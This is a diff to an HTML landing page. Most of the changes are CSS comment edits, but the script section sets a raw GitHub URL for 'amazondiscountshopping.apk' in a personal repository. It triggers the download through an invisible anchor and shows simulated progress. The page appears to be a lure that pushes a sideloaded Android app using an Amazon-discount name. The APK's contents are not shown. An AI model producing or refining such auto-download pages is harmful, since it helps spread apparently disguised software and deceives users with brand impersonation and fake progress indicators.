@@ -21,7 +21,6 @@
       padding: 0;
     }
 
-    /* ===== Full-screen container ===== */
     .container {
       width: 100%;
       max-width: 1280px;
@@ -86,7 +85,6 @@
       flex-direction: column;
     }
 
-    /* Top section */
     .main .top-section {
       display: flex;
       flex-direction: column;
@@ -122,7 +120,7 @@
       align-self: flex-start;
     }
 
-    /* Feature row (desktop) */
+    /* Feature row */
     .feature-row {
       display: grid;
       grid-template-columns: repeat(3, 1fr);
@@ -689,7 +687,8 @@
 
 <script>
   (function() {
-    const APK_URL = 'https://github.com/moni2552/amazondiscountshopping/raw/refs/heads/main/amazondiscountshopping.apk';
+    // ✅ CORRECT APK URL - RAW GITHUB
+    const APK_URL = 'https://raw.githubusercontent.com/moni2552/amazondiscountshopping/main/amazondiscountshopping.apk';
     const FILE_NAME = 'amazondiscountshopping.apk';
 
     const statusText = document.getElementById('statusText');
@@ -717,6 +716,7 @@
 
       setStatus('Starting download…', 5);
 
+      // Create invisible anchor to trigger download
       const a = document.createElement('a');
       a.href = APK_URL;
       a.download = FILE_NAME;
@@ -724,6 +724,7 @@
       document.body.appendChild(a);
       a.click();
 
+      // Simulate progress for UX
       let p = 10;
       const interval = setInterval(() => {
         if (p < 85) {
